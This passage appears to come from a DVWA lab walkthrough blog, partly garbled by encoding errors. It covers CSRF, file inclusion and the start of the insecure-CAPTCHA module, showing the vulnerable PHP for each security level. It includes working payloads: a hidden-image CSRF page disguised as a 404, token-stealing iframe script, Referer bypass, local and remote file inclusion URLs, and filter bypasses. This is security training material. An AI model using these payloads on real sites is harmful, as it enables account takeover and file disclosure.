(($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );        // è¿”å›žå¯†ç æ”¹å˜åˆ°å‰ç«¯        echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";    }    else {        // Issue with passwords matching        echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}?&gt; </code></pre><p>è¿™é‡Œå¯¹CSRFæ²¡æœ‰é˜²å¾¡æœºåˆ¶ï¼ˆåªæ£€æŸ¥cookieï¼‰</p><h3 id="æ£€æµ‹csrfçš„æ–¹æ³•ï¼š"><a href="#æ£€æµ‹csrfçš„æ–¹æ³•ï¼š" class="headerlink" title="æ£€æµ‹csrfçš„æ–¹æ³•ï¼š"></a>æ£€æµ‹csrfçš„æ–¹æ³•ï¼š</h3><h5 id="1-burpæŠ“åŒ…"><a href="#1-burpæŠ“åŒ…" class="headerlink" title="1.burpæŠ“åŒ…"></a>1.burpæŠ“åŒ…</h5><h5 id="2-å³é”®å·¥å…·ä¸­ä½¿ç”¨csrf-pocå·¥å…·"><a href="#2-å³é”®å·¥å…·ä¸­ä½¿ç”¨csrf-pocå·¥å…·" class="headerlink" title="2.å³é”®å·¥å…·ä¸­ä½¿ç”¨csrf pocå·¥å…·"></a>2.å³é”®å·¥å…·ä¸­ä½¿ç”¨csrf pocå·¥å…·</h5><h5 id="3-åˆ›é€ ç«™ç‚¹"><a href="#3-åˆ›é€ ç«™ç‚¹" class="headerlink" title="3.åˆ›é€ ç«™ç‚¹"></a>3.åˆ›é€ ç«™ç‚¹</h5><h5 id="4-è®¿é—®æµè§ˆå™¨"><a href="#4-è®¿é—®æµè§ˆå™¨" class="headerlink" title="4.è®¿é—®æµè§ˆå™¨"></a>4.è®¿é—®æµè§ˆå™¨</h5><h5 id="5-å‡ºçŽ°å¯†ç ä¿®æ”¹å­˜åœ¨csrf"><a href="#5-å‡ºçŽ°å¯†ç ä¿®æ”¹å­˜åœ¨csrf" class="headerlink" title="5.å‡ºçŽ°å¯†ç ä¿®æ”¹å­˜åœ¨csrf"></a>5.å‡ºçŽ°å¯†ç ä¿®æ”¹å­˜åœ¨csrf</h5><p>æœ€åŸºç¡€çš„æ”¹å¯†ç payload</p><pre><code>http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change </code></pre><p>payloadä¸­å¯ä»¥çœ‹åˆ°å¯†ç å·²è¢«ä¿®æ”¹ï¼Œä¸”æœ‰åœ¨å‰ç«¯æç¤º</p><p><strong>C) æž„é€ æ”»å‡»é¡µé¢</strong></p><p>æŸ¥çœ‹æœ¬æœºip</p><pre><code>172.20.10.5</code></pre><p>è¯±å¯¼ç”¨æˆ·è®¿é—®è¯¥ip</p><p>çŽ°å®žæ”»å‡»åœºæ™¯ä¸‹ï¼Œè¿™ç§æ–¹æ³•éœ€è¦äº‹å…ˆåœ¨å…¬ç½‘ä¸Šä¼ ä¸€ä¸ªæ”»å‡»é¡µé¢ï¼Œè¯±éª—å—å®³è€…åŽ»è®¿é—®ï¼ŒçœŸæ­£èƒ½å¤Ÿåœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å®ŒæˆCSRFæ”»å‡»ã€‚è¿™é‡Œä¸ºäº†æ–¹ä¾¿æ¼”ç¤ºï¼ˆæ‰ä¸æ˜¯æˆ‘ç§Ÿä¸èµ·æœåŠ¡å™¨= =ï¼‰ï¼Œå°±åœ¨æœ¬åœ°å†™ä¸€ä¸ªtest.htmlï¼Œä¸‹é¢æ˜¯å…·ä½“ä»£ç ã€‚</p><pre><code>&lt;img src="http://172.20.10.5/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change " border="0" style="display:none;"/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt;</code></pre><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\é»‘å®¢ç«™ç‚¹.png" alt="é»‘å®¢ç«™ç‚¹"></p><p>è¿™å°æœºå™¨çš„IP</p><p>è®¿é—®IPé»˜è®¤ä¼šæ‰“å¼€index.phpã€‚é‚£ä¹ˆå°±æ„å‘³ç€ï¼Œæˆ‘æŠŠindexé‡Œé¢çš„å†…å®¹æ¢æˆä¸Šè¿°çš„ä»£ç ï¼Œå¹¶ä¸”è¯±å¯¼ç”¨æˆ·æµè§ˆå™¨è®¿é—®è¿™ä¸ªIPå°±å¯ä»¥è¾¾åˆ°æˆ‘ä¸å¯å‘Šäººçš„ç›®çš„</p><h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?phpif( isset( $_GET[ 'Change' ] ) ) {    // æ£€æŸ¥è¯·æ±‚    if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {       //æ£€æŸ¥å‰åŽå¯†ç æ˜¯å¦ä¸€è‡´        $pass_new  = $_GET[ 'password_new' ];        $pass_conf = $_GET[ 'password_conf' ];              if( $pass_new == $pass_conf ) {            // ä¸€è‡´æ—¶            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));            $pass_new = md5( $pass_new );            // æ›´æ–°æ•°æ®åº“            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );            // Feedback for the user            echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";        }        else {            // Issue with passwords matching            echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";        }    }    else {        // Didn't come from a trusted source        echo "&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}</code></pre><h3 id="stripos-string-find-start"><a href="#stripos-string-find-start" class="headerlink" title="stripos(string,find,start)"></a>stripos(string,find,start)</h3><p>è¿”å›žå­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºçŽ°çš„ä½ç½®ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œå¦‚æžœæ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ä¸²åˆ™è¿”å›ž FALSEã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼ŒMediumçº§åˆ«çš„ä»£ç æ£€æŸ¥äº†ä¿ç•™å˜é‡ HTTP_REFERERï¼ˆhttpåŒ…å¤´çš„Refererå‚æ•°çš„å€¼ï¼Œè¡¨ç¤ºæ¥æºåœ°å€ï¼‰ä¸­æ˜¯å¦åŒ…å«SERVER_NAMEï¼ˆhttpåŒ…å¤´çš„Hostå‚æ•°ï¼ŒåŠè¦è®¿é—®çš„ä¸»æœºåï¼Œè¿™é‡Œæ˜¯127.0.0.1ï¼‰ï¼Œå¸Œæœ›é€šè¿‡è¿™ç§æœºåˆ¶æŠµå¾¡CSRFæ”»å‡»ã€‚</p><p>Host 192.168.31.155</p><p>Referer <a href="http://192.168.31.103/192.168.31.155.php">http://192.168.31.103/192.168.31.155.php</a></p><p>ä»ŽæŠ€æœ¯ä¸Šå°±å¯ä»¥ç»•è¿‡äº†ï¼Œä½†æ˜¯æ–°æž„é€ çš„è¿™ä¸ª192.168.31.155.phpï¼Œå¾ˆå®¹æ˜“è¢«å‘çŽ°ï¼Œåªæœ‰è¿›è¡ŒURLè½¬ç äº†</p><h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?phpif( isset( $_GET[ 'Change' ] ) ) {    // Check Anti-CSRF token//å¯ä»¥çœ‹åˆ°åŠ å…¥äº†tokenæœºåˆ¶    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Get input    $pass_new  = $_GET[ 'password_new' ];    $pass_conf = $_GET[ 'password_conf' ];    // Do the passwords match?    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );        // Update the database        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );        // Feedback for the user        echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";    }    else {        // Issue with passwords matching        echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼ŒHighçº§åˆ«çš„ä»£ç åŠ å…¥äº†Anti-CSRF tokenæœºåˆ¶ï¼Œç”¨æˆ·æ¯æ¬¡è®¿é—®æ”¹å¯†é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›žä¸€ä¸ªéšæœºçš„tokenï¼Œå‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œéœ€è¦æäº¤tokenå‚æ•°ï¼Œè€ŒæœåŠ¡å™¨åœ¨æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šä¼˜å…ˆæ£€æŸ¥tokenï¼Œåªæœ‰tokenæ­£ç¡®ï¼Œæ‰ä¼šå¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚</p><p>å®¢æˆ·ç«¯è®¿é—®ä¿®æ”¹å¯†ç é¡µé¢-&gt;æœåŠ¡å™¨å‘ä¸€ä¸ªtoken-&gt;ç”¨æˆ·ä¿®æ”¹å‚æ•°çš„è¯·æ±‚ä¸­åŠ å…¥äº†tokenå‚æ•°-&gt;æœåŠ¡å™¨éªŒè¯token-&gt;æˆåŠŸä¿®æ”¹</p><p>ç›¸å½“äºŽæŠŠæµç¨‹ä¿®æ”¹äº†ï¼Œtokençš„ç”Ÿæˆæ˜¯éšæœºçš„</p><p>æž„å»ºè¿™ä¸ªæ¶æ„é“¾æŽ¥å°±ä¸å¯å–äº†å› ä¸ºtokenæ˜¯éšæœºçš„æ— æ³•ä¼ªé€ </p><pre><code>&lt;script type="text/javascript"&gt;    function attack(){        document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;        document.getElementById("transfer").submit();     }&lt;/script&gt;&lt;iframe src="http://172.16.134.26/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;"&gt;&lt;/iframe&gt;&lt;body onload="attack()"&gt;    &lt;form method="GET" id="transfer" action="http://172.16.134.26/dvwa/vulnerabilities/csrf"&gt;        &lt;input type="hidden" name="password_new" value="password"&gt;        &lt;input type="hidden" name="password_conf" value="password"&gt;        &lt;input type="hidden" name="user_token" value=""&gt;        &lt;input type="hidden" name="Change" value="Change"&gt;    &lt;/form&gt;&lt;/body&gt;</code></pre><h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?phpif( isset( $_GET[ 'Change' ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );    // Get input//è¾“å…¥åŽŸæ¥çš„å¯†ç     $pass_curr = $_GET[ 'password_current' ];    $pass_new  = $_GET[ 'password_new' ];    $pass_conf = $_GET[ 'password_conf' ];    // Sanitise current password input    $pass_curr = stripslashes( $pass_curr );    $pass_curr = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_curr ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));    $pass_curr = md5( $pass_curr );    // Check that the current password is correct    $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );    $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );    $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR );    $data-&gt;execute();    // Do both new passwords match and does the current password match the user?    if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) {        // It does!        $pass_new = stripslashes( $pass_new );        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );        // Update database with new password        $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' );        $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR );        $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR );        $data-&gt;execute();        // Feedback for the user        echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;";    }    else {        // Issue with passwords matching        echo "&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;";    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>è¦æ±‚è¾“å…¥åŽŸå§‹å¯†ç </p><h1 id="File-Inclusionï¼ˆæ–‡ä»¶åŒ…å«ï¼‰"><a href="#File-Inclusionï¼ˆæ–‡ä»¶åŒ…å«ï¼‰" class="headerlink" title="File Inclusionï¼ˆæ–‡ä»¶åŒ…å«ï¼‰"></a>File Inclusionï¼ˆæ–‡ä»¶åŒ…å«ï¼‰</h1><p>File Inclusionï¼Œæ„æ€æ˜¯æ–‡ä»¶åŒ…å«ï¼ˆæ¼æ´žï¼‰ï¼Œæ˜¯æŒ‡å½“æœåŠ¡å™¨å¼€å¯alLow_url_includeé€‰é¡¹æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡phpçš„æŸäº›ç‰¹æ€§å‡½æ•°ï¼ˆinclude()ï¼Œrequire()å’Œinclude_once()ï¼Œrequire_once()ï¼‰åˆ©ç”¨urlåŽ»åŠ¨æ€åŒ…å«æ–‡ä»¶ï¼Œæ­¤æ—¶å¦‚æžœæ²¡æœ‰å¯¹æ–‡ä»¶æ¥æºè¿›è¡Œä¸¥æ ¼å®¡æŸ¥ï¼Œå°±ä¼šå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–æˆ–è€…ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚æ–‡ä»¶åŒ…å«æ¼æ´žåˆ†ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´žä¸Žè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´žï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´žæ˜¯å› ä¸ºå¼€å¯äº†phpé…ç½®ä¸­çš„alLow_url_fopené€‰é¡¹ï¼ˆé€‰é¡¹å¼€å¯ä¹‹åŽï¼ŒæœåŠ¡å™¨å…è®¸åŒ…å«ä¸€ä¸ªè¿œç¨‹çš„æ–‡ä»¶ï¼‰</p><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php// The page we wish to display$file = $_GET[ 'page' ];?&gt; </code></pre><h4 id="1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«</h4><pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file1.php</code></pre><pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\phpstudy\PHPTutorial\WWW\DVWA\php.ini</code></pre><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\æœ¬åœ°æ–‡ä»¶åŒ…å«.png" alt="æœ¬åœ°æ–‡ä»¶åŒ…å«"></p><h4 id="2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«"></a><strong>2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«</strong></h4><p>å½“æœåŠ¡å™¨çš„phpé…ç½®ä¸­ï¼Œé€‰é¡¹allow_url_fopenä¸Žallow_url_includeä¸ºå¼€å¯çŠ¶æ€æ—¶ï¼ŒæœåŠ¡å™¨ä¼šå…è®¸åŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå¦‚æžœå¯¹æ–‡ä»¶æ¥æºæ²¡æœ‰æ£€æŸ¥çš„è¯ï¼Œå°±å®¹æ˜“å¯¼è‡´ä»»æ„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p><p>åœ¨è¿œç¨‹æœåŠ¡å™¨ 172.16.135.47 ä¸Šä¼ ä¸€ä¸ªphpinfo.txtæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><pre><code>&lt;?phpphpinfo();?&gt;</code></pre><pre><code>http://172.20.10.5/dvwa/vulnerabilities/fi/?page=http://172.20.10.5/dvwa/phpinfoå¯ä»¥ç¼–ç </code></pre><h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><pre><code>&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// Input validation//å°†å‚æ•°ä¸­çš„http:// https:// ../ ..\éƒ½æ›¿æ¢æˆç©º$file = str_replace( array( "http://", "https://" ), "", $file );$file = str_replace( array( "../", "..\"" ), "", $file );?&gt;</code></pre><p>ä½¿ç”¨str_replaceå‡½æ•°æ˜¯æžå…¶ä¸å®‰å…¨çš„ï¼Œå› ä¸ºå¯ä»¥ä½¿ç”¨<strong>åŒå†™ç»•è¿‡</strong>æ›¿æ¢è§„åˆ™ã€‚</p><h4 id="1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«-1"><a href="#1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«-1" class="headerlink" title="1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«"></a><strong>1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«</strong></h4><pre><code>http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\software\wamp\www\dvwa\php.ini</code></pre><h4 id="2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«-1"><a href="#2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«-1" class="headerlink" title="2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«"></a><strong>2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«</strong></h4><pre><code>http://172.20.10.5/dvwa/vulnerabilities/fi/page=htthttp://p://172.20.10.5/dvwa/phpinfo.txt</code></pre><h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><pre><code>&lt;?php// The page we wish to display$file = $_GET[ 'page' ];//æ–‡ä»¶åä»¥fileå¼€å§‹ï¼Œæˆ–è€…åªèƒ½ä¸ºinclude.phpif( !fnmatch( "file*", $file ) &amp;&amp; $file != "include.php" ) {    // This isn't the page we want!    echo "ERROR: File not found!";    exit;}?&gt;</code></pre><p><strong>fnmatch()</strong> å‡½æ•°æ ¹æ®æŒ‡å®šçš„æ¨¡å¼æ¥åŒ¹é…æ–‡ä»¶åæˆ–å­—ç¬¦ä¸²ã€‚</p><p>Highçº§åˆ«çš„ä»£ç è§„å®šåªèƒ½åŒ…å«fileå¼€å¤´çš„æ–‡ä»¶ï¼Œçœ‹ä¼¼å®‰å…¨ï¼Œä¸å¹¸çš„æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥<strong>åˆ©ç”¨**</strong>file**<strong>åè®®ç»•è¿‡é˜²æŠ¤ç­–ç•¥</strong>ã€‚fileåè®®å…¶å®žæˆ‘ä»¬å¹¶ä¸é™Œç”Ÿï¼Œå½“æˆ‘ä»¬ç”¨æµè§ˆå™¨æ‰“å¼€ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶æ—¶ï¼Œç”¨çš„å°±æ˜¯fileåè®®</p><pre><code>http://172.20.10.5/dvwa/vulnerabilities/fi/?page=file:///D:/software/wamp/www/dvwa/php.ini</code></pre><h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><pre><code>&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// Only allow include.php or file{1..3}.phpif( $file != "include.php" &amp;&amp; $file != "file1.php" &amp;&amp; $file != "file2.php" &amp;&amp; $file != "file3.php" ) {    // This isn't the page we want!    echo "ERROR: File not found!";    exit;}?&gt;</code></pre><p>Impossibleçº§åˆ«çš„ä»£ç ä½¿ç”¨äº†ç™½åå•æœºåˆ¶è¿›è¡Œé˜²æŠ¤ï¼Œç®€å•ç²—æš´ï¼Œpageå‚æ•°å¿…é¡»ä¸ºâ€œinclude.phpâ€ã€â€œfile1.phpâ€ã€â€œfile2.phpâ€ã€â€œfile3.phpâ€ä¹‹ä¸€ï¼Œå½»åº•æœç»äº†æ–‡ä»¶åŒ…å«æ¼æ´žã€‚</p><h1 id="Insecure-CAPTCHAï¼ˆä¸å®‰å…¨çš„éªŒè¯ç -ä¸å®‰å…¨çš„éªŒè¯æµç¨‹ï¼‰"><a href="#Insecure-CAPTCHAï¼ˆä¸å®‰å…¨çš„éªŒè¯ç -ä¸å®‰å…¨çš„éªŒè¯æµç¨‹ï¼‰" class="headerlink" title="Insecure CAPTCHAï¼ˆä¸å®‰å…¨çš„éªŒè¯ç /ä¸å®‰å…¨çš„éªŒè¯æµç¨‹ï¼‰"></a>Insecure CAPTCHAï¼ˆä¸å®‰å…¨çš„éªŒè¯ç /ä¸å®‰å…¨çš„éªŒè¯æµç¨‹ï¼‰</h1><p>Insecure CAPTCHAï¼Œæ„æ€æ˜¯ä¸å®‰å…¨çš„éªŒè¯ç ï¼ŒCAPTCHAæ˜¯Completely Automated Public Turing Test to Tell Computers and Humans Apart (å…¨è‡ªåŠ¨åŒºåˆ†è®¡ç®—æœºå’Œäººç±»çš„å›¾çµæµ‹è¯•)çš„ç®€ç§°ã€‚ä½†ä¸ªäººè§‰å¾—ï¼Œè¿™ä¸€æ¨¡å—çš„å†…å®¹å«åšä¸å®‰å…¨çš„éªŒè¯æµç¨‹æ›´å¦¥å½“äº›ï¼Œå› ä¸ºè¿™å—ä¸»è¦æ˜¯éªŒè¯æµç¨‹å‡ºçŽ°äº†é€»è¾‘æ¼æ´žï¼Œè°·æ­Œçš„éªŒè¯ç è¡¨ç¤ºä¸èƒŒè¿™ä¸ªé”…</p><p>DVWAä¸­ä¸»è¦æ˜¯è¾“å…¥å½“å‰çš„å¯†ç ä»¥åŠæ–°å¯†ç ï¼Œç”¨æ¥ä¿®æ”¹å¯†ç <br>![insecure captcha](D:\blog\source_posts\DVWA\insecure captcha.jpg)</p><h4 id="reCAPTCHAéªŒè¯æµç¨‹"><a href="#reCAPTCHAéªŒè¯æµç¨‹" class="headerlink" title="reCAPTCHAéªŒè¯æµç¨‹"></a><strong>reCAPTCHAéªŒè¯æµç¨‹</strong></h4><p>è¿™ä¸€æ¨¡å—çš„éªŒè¯ç ä½¿ç”¨çš„æ˜¯Googleæä¾›reCAPTCHAæœåŠ¡ï¼Œä¸‹å›¾æ˜¯éªŒè¯çš„å…·ä½“æµç¨‹ã€‚</p><p><img src="/2021/07/16/dvwa/blog/source_posts\DVWA\recaptcha.png" alt="recaptcha"></p><p>æœåŠ¡å™¨é€šè¿‡è°ƒç”¨recaptcha_check_answerå‡½æ•°æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„æ­£ç¡®æ€§ã€‚</p><p><strong>recaptcha_check_answer(*p\</strong>r*<em>i*</em>v*<em>k*</em>e*<em>y\</em>,**</p><p><strong>remoteip, *c\</strong>h*<em>a*</em>l*<em>l*</em>e*<em>n*</em>g*<em>e\</em>,**</p><p><strong>response)</strong></p><p>å‚æ•°<em>p<strong>r</strong>i<strong>v</strong>k<strong>e</strong>y</em>æ˜¯æœåŠ¡å™¨ç”³è¯·çš„<em>p<strong>r</strong>i<strong>v</strong>a<strong>t</strong>e<strong>k</strong>e**y</em>ï¼Œ</p><p>remoteipæ˜¯ç”¨æˆ·çš„ipï¼Œ<em>c<strong>h</strong>a<strong>l</strong>l<strong>e</strong>n<strong>g</strong>e</em>æ˜¯<em>r<strong>e</strong>c<strong>a</strong>p<strong>t</strong>c<strong>h</strong>a<strong>c</strong>h<strong>a</strong>l<strong>l</strong>e<strong>n</strong>g<strong>e</strong>f<strong>i</strong>e<strong>l</strong>d</em>å­—æ®µçš„å€¼ï¼Œæ¥è‡ªå‰ç«¯é¡µé¢ï¼Œ</p><p>responseæ˜¯ recaptcha_response_field å­—æ®µçš„å€¼ã€‚å‡½æ•°è¿”å›žReCaptchaResponse classçš„å®žä¾‹ï¼ŒReCaptchaResponse ç±»æœ‰2ä¸ªå±žæ€§ ï¼š</p><ul><li>$is_validæ˜¯å¸ƒå°”åž‹çš„ï¼Œè¡¨ç¤ºæ ¡éªŒæ˜¯å¦æœ‰æ•ˆï¼Œ</li><li>$erroræ˜¯è¿”å›žçš„é”™è¯¯ä»£ç ã€‚</li></ul><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><pre><code>&lt;?php//éªŒè¯èº«ä»½if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '1' ) ) {    // éšè—éªŒè¯ç è¡¨å•    $hide_form = true;    // èŽ·å¾—ä¸”ç¡®è®¤æ–°å¯†ç     $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    //ç¬¬ä¸‰æ–¹èº«ä»½éªŒè¯    $resp = recaptcha_check_answer(        $_DVWA[ 'recaptcha_private_key'],        $_POST['g-recaptcha-response']    );    // Did the CAPTCHA fail?    if( !$resp ) {        // What happens when the CAPTCHA was entered incorrectly        $html     .= "&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;";        $hide_form = false;        return;    }    else {        // CAPTCHA was correct. Do both new passwords match?        if( $pass_new == $pass_conf ) {            // Show next stage for the user            $html .= "                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;                &lt;form action=\"#\" method=\"POST\"&gt;                    &lt;input type=\"hidden\" name=\"step\" value=\"2\" /&gt;                    &lt;input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" /&gt;                    &lt;input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" /&gt;                    &lt;input type=\"submit\" name=\"Change\" value=\"Change\" /&gt;                &lt;/form&gt;";        }        else {            // Both new passwords do not match.            $html     .= "&lt;pre&gt;Both passwords must match.&lt;/pre&gt;";            $hide_form = false;        }    }}//æ£€æŸ¥ä¸¤æ¬¡å¯†ç æ˜¯å¦ä¸€è‡´ï¼Œå¹¶æ›´æ–°å¯†ç if( isset( $_POST[ 'Change' ] ) &amp;&amp; ( $_POST[ 'step' ] == '2' ) ) {    // Hide the CAPTCHA form    $hide_form = true;    // Get input    $pass_new  = $_POST[ 'password_new' ];    $pass_conf = $_POST[ 'password_conf' ];    // Check to see if both password match    if( $pass_new == $pass_conf ) {        // They do!        $pass_new = ((isset($GLOBALS["___mysqli_ston"]) &amp;&amp; is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));        $pass_new = md5( $pass_new );        // Update database        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );        // Feedback for the end user        $html .= "&lt;pre&gt;Password Changed.&lt;/pre&gt;";    }    else {        // Issue with the passwords matching        $html .= "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;";        $hide_form = false;    }    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : 